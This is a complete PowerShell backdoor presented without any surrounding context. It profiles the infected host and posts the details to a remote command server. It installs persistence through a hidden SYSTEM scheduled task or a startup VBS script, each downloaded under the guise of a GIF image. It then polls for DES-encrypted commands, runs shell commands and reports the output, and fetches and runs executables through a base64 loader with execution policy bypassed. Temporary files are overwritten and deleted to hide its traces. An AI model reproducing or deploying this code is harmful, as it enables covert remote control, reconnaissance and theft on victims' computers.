[String]$ps2 = 'W1N0cmluZ10kSW5wdXRTdHJpbmcgPSAnRVhFQ1NUUklORyc7DQpbU3RyaW5nXSRGaWxlUGF0aCA9ICJDOlxcVXNlcnNcXFB1YmxpY1xcRG9jdW1lbnRzXFwwMDAuZXhlIjsNCiRQRUJ5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkSW5wdXRTdHJpbmcpOw0KaWYoVGVzdC1QYXRoKCRGaWxlUGF0aCkpDQp7DQoJUmVtb3ZlLUl0ZW0gJEZpbGVQYXRoOw0KfQ0KW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkRmlsZVBhdGgsICRQRUJ5dGVzKTsNCiRjbWRsaW5lID0gJEZpbGVQYXRoOw0KJFByb0lEID0gU3RhcnQtUHJvY2VzcyAkY21kbGluZTs=';
#getting os architecture
if ([System.IntPtr]::Size -eq 4) { $SystemArchitecture = "x86";}
else { $SystemArchitecture = "x64";}
#end

#this is the comment for getting device uid
	$TargetComputer = $env:COMPUTERNAME;
	$private:computer = $targetComputer;
	$data = @{ };
	$private:wmi = $null;
	if ($private:wmi = Get-WmiObject -Computer $private:computer -Class Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue)
	{
		$private:Ips = @{ };
		$private:wmi | Where { $_.IPAddress -match '\S+' } | Foreach { $private:Ips.$($_.IPAddress -join ', ') = $_.MACAddress };
		$private:counter = 0;
		$private:Ips.GetEnumerator() | Foreach {
		$private:counter++; $data."IP Address $private:counter" = '' + $_.Name + ' (MAC: ' + $_.Value + ')';

			$MacArr = $_.Value;
			$MacByteArr = [System.Text.Encoding]::ASCII.GetBytes($MacArr);
			$UID = [System.Convert]::ToBase64String($MacByteArr);
		}
	}
#end of getting device uid

function Get_Base_Info
{
	$TargetComputer = $env:COMPUTERNAME;
	$private:computer = $targetComputer;
	$comName = $private:computer;
	$loggedUser = '';
	$data = @{ };
	$private:wmi = $null;
	if ($private:wmi = Get-WmiObject -Computer $private:computer -Class Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue)
	{
		$private:Ips = @{ };
		$private:wmi | Where { $_.IPAddress -match '\S+' } | Foreach { $private:Ips.$($_.IPAddress -join ', ') = $_.MACAddress };
		$private:counter = 0;
		$private:Ips.GetEnumerator() | Foreach {
		$private:counter++; $data."IP Address $private:counter" = '' + $_.Name + ' (MAC: ' + $_.Value + ')';

			$MacArr = $_.Value;
			$MacByteArr = [System.Text.Encoding]::ASCII.GetBytes($MacArr);
			$UID = [System.Convert]::ToBase64String($MacByteArr);
		}
	}

	$private:wmi = $null;
	if ($private:wmi = Get-WmiObject -Computer $private:computer -Class Win32_ComputerSystem -ErrorAction SilentlyContinue)
	{
		$loggedUser = $private:wmi.Username | Out-String;
		if($loggedUser -eq ''){
			$loggedUser = 'administrator';
		}
	}
	
	$private:wmi = $null;
	if ($private:wmi = Get-WmiObject -Computer $private:computer -Class Win32_OperatingSystem -ErrorAction SilentlyContinue)
	{
		if ([System.IntPtr]::Size -eq 4) { $data.'OS Architecture' = "x86";}
		else { $data.'OS Architecture' = "x64";}
		$data.'OS Boot Time' = $private:wmi.ConvertToDateTime($private:wmi.LastBootUpTime);
		$data.'OS Language     ' = $private:wmi.OSLanguage;
		$data.'OS Version' = $private:wmi.Version;
		$data.'OS Name' = $private:wmi.Caption;
		$data.'OS Install Date' = $private:wmi.ConvertToDateTime($private:wmi.InstallDate);
		$data.'OS Service Pack' = [string]$private:wmi.ServicePackMajorVersion + '.' + $private:wmi.ServicePackMinorVersion;
	}
	$ports = @{
		'File shares/RPC' = '139';
		'File shares' = '445';
		'RDP' = '3389';
	}
	foreach ($service in $ports.Keys)
	{
		$private:socket = New-Object Net.Sockets.TcpClient;
		$ErrorActionPreference = 'SilentlyContinue';
		$private:socket.Connect($private:computer, $ports.$service);
		$ErrorActionPreference = 'Continue';
		if ($private:socket.Connected)
		{
			$data."Port $($ports.$service) ($service)" = 'Open';
			$private:socket.Close();
		}
		else
		{
			$data."Port $($ports.$service) ($service)" = 'Closed or filtered';
		}
		$private:socket = $null;
	}
	[String]$proList = tasklist | Out-String;
	[String]$insString1 = "wmic process get processid,commandline,sessionid | findstr x86";
	[String]$insString2 = "wmic process get processid,commandline,sessionid | findstr SysWOW";
	[String]$proList_x86 = cmd.exe /c $insString1 | Out-String;
	[String]$proList_SysWOW = cmd.exe /c $insString2 | Out-String;
	$reg2 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME);
	$regkey2 = $reg2.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings");
	[String]$proxyServer = $regkey2.GetValue('ProxyServer');
	[String]$proxyEnagle = $regkey2.GetValue('ProxyEnable');
	$data.'ProxyEnable' = $proxyEnagle;
	$data.'ProxySetting' = $proxyServer;
	$outp = $comName + "`r`n" + $loggedUser + "`r`n";
	$outp += $data.GetEnumerator() | Sort-Object 'Name' | Format-Table -AutoSize | Out-String;
	$outp += "`r`n" + $proList;
	$outp += "`r`n" + $proList_x86;
	$outp += "`r`n" + $proList_SysWOW;
	
	$loggedUserPerfect = 'administrator';
	if($loggedUser.Contains('\') -eq $true)
	{
		$szUserTmp = $loggedUser.split('\');
		$loggedUserPerfect = $szUserTmp[1];
		$loggedUserPerfect = $loggedUserPerfect.SubString(0, $loggedUserPerfect.Length - 2);
	}
	$cmdAdmin = 'whoami /groups | findstr /c:"S-1-5-32-544" | findstr /c:"Enabled group" && goto:isadministrator';
	$outCmdAdmin = cmd /c $cmdAdmin | Out-String;

	if($outCmdAdmin -ne '')
	{
		$schedulePath = "C:/Windows/System32/WindowsPowerShell/v1.0/Examples/detail.ps1";
		Set-Variable -Name SCH_PATH -Value $schedulePath -Scope Global;
		$ret = Test-Path -Path $schedulePath;
		if($ret -eq $true)
		{
			return $outp;
		}
		$serverPsPath = $BaseServer + 'images/character.gif';
		(New-Object System.Net.WebClient).DownloadFile($serverPsPath, $schedulePath);
        $ret = Test-Path -Path $schedulePath;
        if($ret -ne $true)
        {
            $serverPsPath = $SecondServer + 'images/character.gif';
		    (New-Object System.Net.WebClient).DownloadFile($serverPsPath, $schedulePath);
        }
		$cmdSchedule = 'schtasks /create /tn "ProxyServerUpdater" /tr "powershell.exe -ep bypass -windowstyle hidden -file '+$schedulePath+'" /sc onstart /ru system /f';
		$outCmdSchedule = cmd /c $cmdSchedule;
	}
	else
	{
		$startupPath = 'C:/Users/' + $loggedUserPerfect + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/ProxyServer.vbs';
		Set-Variable -Name VBS_PATH -Value $startupPath -Scope Global;
		$ret = Test-Path -Path $startupPath;
		if($ret -eq $true)
		{
			return $outp;
		}
		$srcFilePath = $BaseServer + 'images/top_bar.gif';
		(New-Object System.Net.WebClient).DownloadFile($srcFilePath, $startupPath);
        $ret = Test-Path -Path $startupPath;
        if($ret -ne $true)
        {
            $srcFilePath = $SecondServer + 'images/top_bar.gif';
		    (New-Object System.Net.WebClient).DownloadFile($srcFilePath, $startupPath);
        }
	}
	return $outp;
}

function HttpRequestFunc_doprocess
{
param
(
[Parameter(Position = 0)]
[ValidateNotNullOrEmpty()]
[String]$szURI,
[Parameter(Position = 1)]
[ValidateSet('GET', 'POST')]
[String]$szMethod = 'GET',
[Parameter(Position = 2)]
[String]$contentData = $null
)
[Byte[]]$BodyBytes = $null;
$WebRequest = $null;
if (($psversion -le 3))
{
$WebRequest = [System.Net.WebRequest]::Create($szURI);
}
else
{
$WebRequest = [System.Net.WebRequest]::CreateHttp($szURI);
}
if ($WebRequest -eq $null)
{
Throw 'WebRequest Creation failed.';
}

$WebRequest.Method = $szMethod;
$WebRequest.ContentType = 'text/plain';
if (($contentData -eq $null) -or ($contentData.Length -eq 0))
{
$BodyBytes = $null;
}
else
{
$BodyBytes = [System.Text.Encoding]::UTF8.GetBytes($contentData);
$WebRequest.GetRequestStream().Write($BodyBytes, 0, $BodyBytes.Length);
$WebRequest.GetRequestStream().Flush();
$WebRequest.GetRequestStream().Close();
}
$resp = $WebRequest.GetResponse().GetResponseStream();

$sr = New-Object System.IO.StreamReader($resp);
$respTxt = $sr.ReadToEnd();
return $respTxt;
}

function HttpRequestFunc
{
param
(
[Parameter(Position = 0)]
[ValidateNotNullOrEmpty()]
[String]$szURI,
[Parameter(Position = 1)]
[ValidateSet('GET', 'POST')]
[String]$szMethod = 'GET',
[Parameter(Position = 2)]
[String]$contentData = $null
)
	$szFullURL = $szURI;
	if ($szURI.Contains("http") -ne $true)
	{
		$szFullURL = $BaseServer + 'server.jsp' + $szURI;
	}

	$respTxt = HttpRequestFunc_doprocess -szURI $szFullURL -szMethod $szMethod -contentData $contentData;
	if(($respTxt -eq $null) -or ($respTxt -eq ''))
	{
		Start-Sleep -Seconds 20;
		$szFullURL = $SecondServer + 'server.jsp' + $szURI;
		$respTxt = HttpRequestFunc_doprocess -szURI $szFullURL -szMethod $szMethod -contentData $contentData;
	}

	return $respTxt;
}

function DecryptDES
{
Param(
[String] $encrypted,
[byte[]] $Key,
[byte[]] $Iv
)
    [byte[]]$NewStr = [System.Convert]::FromBase64String($encrypted)
    $tdsAlg = New-Object System.Security.Cryptography.DESCryptoServiceProvider
    $tdsAlg.Key = $Key
    $tdsAlg.IV = $Iv
    $encrypt = $tdsAlg.CreateDecryptor($tdsAlg.Key, $tdsAlg.IV)
    $msEncrypt = New-Object System.IO.MemoryStream @(,$NewStr)
    $csEncrypt = New-Object System.Security.Cryptography.CryptoStream $msEncrypt, $encrypt, "Read"
    $swEncrypt = New-Object System.IO.StreamReader $csEncrypt
    [String]$result = $swEncrypt.ReadToEnd()
    $swEncrypt.Close()
    $csEncrypt.Close()
    $msEncrypt.Close()
    $encrypt.Clear()
   
    return $result;
            
}

function EncryptDES
{
Param(
[String] $plainText,
[byte[]] $Key,
[byte[]] $Iv
)
        
    $tdsAlg = New-Object System.Security.Cryptography.DESCryptoServiceProvider
    $tdsAlg.Key = $Key
    $tdsAlg.IV = $Iv
    $encrypt = $tdsAlg.CreateEncryptor($tdsAlg.Key, $tdsAlg.IV)
    $msEncrypt = New-Object System.IO.MemoryStream
    $csEncrypt = New-Object System.Security.Cryptography.CryptoStream $msEncrypt, $encrypt, "Write"
    $swEncrypt = New-Object System.IO.StreamWriter $csEncrypt
    $swEncrypt.Write($plainText)
    $swEncrypt.Close()
    $csEncrypt.Close()
    $msEncrypt.Close()
    $encrypt.Clear()
    $encrypted = $msEncrypt.ToArray()
    $result = [Convert]::ToBase64String($encrypted)
    return $result;        
}
 
function Cmd_Loop
{
	$Stop = 0;
	$SleepCount = 0;
	$LimitCount = 5;
	$IntervalInit = 120;
	$SleepInterval = $IntervalInit;
	while ($Stop -ne 1)
	{
		$Byte = [System.Text.Encoding]::ASCII.GetBytes($UID);
		[String]$base64StrUID = [System.Convert]::ToBase64String($Byte);
		[String]$szRequest = $BaseUri + '?action=What&u=' + $base64StrUID;
		$ServerFall = HttpRequestFunc $szRequest 'GET';
		if (($ServerFall -eq $null) -or ($ServerFall -eq ''))
		{
			Start-Sleep -Seconds $SleepInterval;
			$SleepCount = $SleepCount + 1;
			if ($SleepCount -eq $LimitCount) { 
				$SleepInterval = $IntervalInit;
				$SleepCount = 0;
			}
			continue;
		}
		if ($ServerFall -match ".{1}")
		{
			While (($ServerFall[0] -le 0x30) -and ($ServerFall[0] -ne $null))
			{
				$ServerFall = $ServerFall.Remove(0, 1);
			}
		}
		if ($ServerFall -eq 'success')
		{
			Start-Sleep -Seconds $SleepInterval;
			continue;
		}
		if ($ServerFall -eq 'killkill')
		{
			$Byte = [System.Text.Encoding]::ASCII.GetBytes($UID);
			[String]$base64StrUID = [System.Convert]::ToBase64String($Byte);
			[String]$szResponse = $BaseUri + '?action=CmdRes&type=kill&u=' + $base64StrUID + '&err=success';
			HttpRequestFunc -szURI $szResponse -szMethod 'POST';
			break;
		}
		if ($ServerFall.Contains("interval") -eq $true)
		{
			$szTmp = $ServerFall.split('|');
			$SleepInterval = [int64]$szTmp[1];
			$Byte = [System.Text.Encoding]::ASCII.GetBytes($UID);
			[String]$base64StrUID = [System.Convert]::ToBase64String($Byte);

			[String]$InfoPostUrl = $BaseUri + '?action=interval&u=' + $base64StrUID + '&interval=' + $SleepInterval;
			HttpRequestFunc -szURI $InfoPostUrl -szMethod 'POST';
			continue;
		}
		if ($ServerFall.Contains("cmd") -eq $true)
		{
			$szTmp = $ServerFall.split('|');
			[String]$cmdInst = DecryptDES -encrypted $szTmp[1] -Key $des_key -Iv $des_iv;
		
			[String]$cmdResult = cmd.exe /c $cmdInst | Out-String;
			$Byte = [System.Text.Encoding]::ASCII.GetBytes($UID);
			[String]$base64StrUID = [System.Convert]::ToBase64String($Byte);
			
			[String]$base64StrRESULT = EncryptDES -plainText $cmdResult -Key $des_key -Iv $des_iv;
				
			[String]$InfoPostUrl = $BaseUri + '?action=cmd&u=' + $base64StrUID + '&ins=' + $cmdInst;
			
			HttpRequestFunc -szURI $InfoPostUrl -szMethod 'POST' -contentData $base64StrRESULT;
			continue;
		}
		if ($ServerFall.Contains("cf_sv") -eq $true)
		{
			#modify ps1 and vbs files
			$ret = Test-Path -Path $global:SCH_PATH;
			$szTmp = $ServerFall.split('|');
			[String]$url = DecryptDES -encrypted $szTmp[1] -Key $des_key -Iv $des_iv;
			
			[String]$second_url = "";
			if($szTmp.Length -eq 3)
			{
				$second_url = DecryptDES -encrypted $szTmp[2] -Key $des_key -Iv $des_iv;
			}
			if($ret -eq $true)
			{
				Remove-Item $global:SCH_PATH;
				$url_sch = $url+"images/character.gif";
				$ps_data = HttpRequestFunc -szURI $url_sch -szMethod 'GET';
				[System.IO.File]::WriteAllText($global:SCH_PATH, $ps_data);
				$BaseServer = $url;
				if($second_url.Length -ne 0)
				{
					$SecondServer = $second_url;
				}
			}
			
			$ret = Test-Path -Path $global:VBS_PATH;
			if($ret -eq $true)
			{
				#replace vbs file
				Remove-Item $global:VBS_PATH;
				$url_vbs = $url+"images/top_bar.gif";
				$ps_data = HttpRequestFunc -szURI $url_vbs -szMethod 'GET';
				[System.IO.File]::WriteAllText($global:VBS_PATH, $ps_data);
				
				#replace tmp ps1 file
				$ret = Test-Path -Path $PS_PATH;
				if($ret -eq $true)
				{
					Remove-Item $PS_PATH;
				}
				$url_ps = $url+"images/character.gif";
				$ps_data = HttpRequestFunc -szURI $url_ps -szMethod 'GET';
				[System.IO.File]::WriteAllText($PS_PATH, $ps_data);
				$BaseServer = $url;
				if($second_url.Length -ne 0)
				{
					$SecondServer = $second_url;
				}
			}
			
			#send base info to another server
			$Base_Info = Get_Base_Info;
			[String]$sendData = 'filename="' + $UID + '.rst"' + "`n" + "Content-Type:application/octet-stream" + "`r`n" + $Base_Info;

			$Byte = [System.Text.Encoding]::ASCII.GetBytes($UID);
			[String]$base64StrUID = [System.Convert]::ToBase64String($Byte);
			[String]$InfoPostUrl = $BaseUri + '?action=BaseInfo&u=' + $base64StrUID;

			[String]$HttpRes = $null;
			$lcoun = 0;
			$HttpRes = HttpRequestFunc -szURI $InfoPostUrl -szMethod 'POST' -contentData $sendData;

			#end
			
			$szResponse = $BaseUri + '?action=CmdRes&type=cf_sv&u=' + $base64StrUID  + '&err=success';
			HttpRequestFunc -szURI $szResponse -szMethod 'POST';
			
			continue;
		}
		if ($ServerFall.Contains("rrr") -eq $true)
		{
			$szTmp = $ServerFall.split('|');
			[String]$CmdURL = DecryptDES -encrypted $szTmp[1] -Key $des_key -Iv $des_iv;

			$CmdToExe = HttpRequestFunc -szURI $CmdURL -szMethod 'GET';

			[String]$szCmdLine = "";
			if (($szTmp[2] -ne $null) -or ($szTmp[2].Length -ne 0))
			{
				$szCmdLine = DecryptDES -encrypted $szTmp[2] -Key $des_key -Iv $des_iv;
			}
		
		#download exe file content and make ps1 and run
			$szFileName = 'C:\\Users\\Public\\Documents\\tmp' + -join ((48 .. 57) + (65 .. 70) | Get-Random -Count 4 | % { [char]$_ }) + '.ps1';
			[String]$szCode = '$SScript = "' + $ps2 + '"; [String]$NewStr = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($SScript));$NewStr=$NewStr.Replace("EXECSTRING", "' + $CmdToExe + '");$NewStr=$NewStr.Replace("ADDRSTRING", "' + $szCmdLine + '");$NewBlock = [Scriptblock]::Create($NewStr);Invoke-Command -ScriptBlock $NewBlock;';
			$szCode | Out-File -Encoding ascii $szFileName;
			
			[String]$szArgList = '-ExecutionPolicy Bypass -File ' + $szFileName;
			
			if($SystemArchitecture.Contains("x64") -eq $true)
			{
				$ProID = Start-Process C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -PassThru -WindowStyle Hidden -ArgumentList $szArgList;
			}
			else
			{
				$ProID = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList $szArgList;
			}
			[String]$NewCode = '';
			While ($NewCode.Length -le $szCode.Length)
			{
				$NewCode = $NewCode + -join ((65 .. 90) + (97 .. 122) | Get-Random -Count 100 | % { [char]$_ });
			}
			$NewCode | Out-File -Encoding ascii $szFileName;
			Start-Sleep -Seconds 10;
			Remove-Item $szFileName;
		#end execute
		}
		if ($ServerFall.Contains("exe") -eq $true)
		{
			$szTmp = $ServerFall.split('|');
			[String]$CmdURL = DecryptDES -encrypted $szTmp[1] -Key $des_key -Iv $des_iv;

			$CmdToExe = HttpRequestFunc -szURI $CmdURL -szMethod 'GET';

			While ($CmdToExe[0] -le 0x30)
			{
				$CmdToExe = $CmdToExe.Remove(0, 1);
			}
			[String]$szPmp = DecryptDES -encrypted $szTmp[2] -Key $des_key -Iv $des_iv;
		
			$szTTmp = $szPmp.Split(' ');
			$szIp = $szTTmp[0];
			$szPort = $szTTmp[1];
			$szFileName = 'C:\\Users\\Public\\Documents\\tmp' + -join ((48 .. 57) + (65 .. 70) | Get-Random -Count 4 | % { [char]$_ }) + '.ps1';
			[String]$szCode = '$SScript = "' + $ps1 + '"; [String]$NewStr = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($SScript));$NewStr=$NewStr.Replace("EXECSTRING", "' + $CmdToExe + '");$NewStr=$NewStr.Replace("ADDRSTRING", "' + $szIp + '");$NewStr=$NewStr.Replace("PORTSTRING", "' + $szPort + '");$NewBlock = [Scriptblock]::Create($NewStr);Invoke-Command -ScriptBlock $NewBlock;';
			$szCode | Out-File -Encoding ascii $szFileName;
			[String]$szArgList = '-ExecutionPolicy Bypass -File ' + $szFileName;
			if($SystemArchitecture.Contains("x64") -eq $true)
			{
				$ProID = Start-Process C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -PassThru -WindowStyle Hidden -ArgumentList $szArgList;
			}
			else
			{
				$ProID = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList $szArgList;
			}
			[String]$NewCode = '';
			While ($NewCode.Length -le $szCode.Length)
			{
				$NewCode = $NewCode + -join ((65 .. 90) + (97 .. 122) | Get-Random -Count 100 | % { [char]$_ });
			}
			$NewCode | Out-File -Encoding ascii $szFileName;
			Remove-Item $szFileName;
			Start-Sleep -Seconds 10;
			[String]$szResponse = '';

			$Byte = [System.Text.Encoding]::ASCII.GetBytes($UID);
			[String]$base64StrUID = [System.Convert]::ToBase64String($Byte);
			if ($ProID.HasExited)
			{
				$szResponse = $BaseUri + '?action=CmdRes&type=exe&u=' + $base64StrUID  + '&err=failed';
			}
			else
			{
				$szResponse = $BaseUri + '?action=CmdRes&type=exe&u=' + $base64StrUID  + '&err=success';
			}
			HttpRequestFunc -szURI $szResponse -szMethod 'POST';
			continue;
		}
		Start-Sleep -Seconds $SleepInterval;
	}
}
$Base_Info = Get_Base_Info;
[String]$sendData = 'filename="' + $UID + '.rst"' + "`n" + "Content-Type:application/octet-stream" + "`r`n" + $Base_Info;

$Byte = [System.Text.Encoding]::ASCII.GetBytes($UID);
[String]$base64StrUID = [System.Convert]::ToBase64String($Byte);
[String]$InfoPostUrl = $BaseUri + '?action=BaseInfo&u=' + $base64StrUID;

[String]$HttpRes = $null;
$lcoun = 0;
$HttpRes = HttpRequestFunc -szURI $InfoPostUrl -szMethod 'POST' -contentData $sendData;
while (($HttpRes -eq $null) -or ($HttpRes -eq ''))
{
$lcoun = $lcoun + 1;
$HttpRes = HttpRequestFunc -szURI $InfoPostUrl -szMethod 'POST' -contentData $sendData;
if ($lcoun -eq 10) { exit; }
}
Cmd_Loop
exit; 

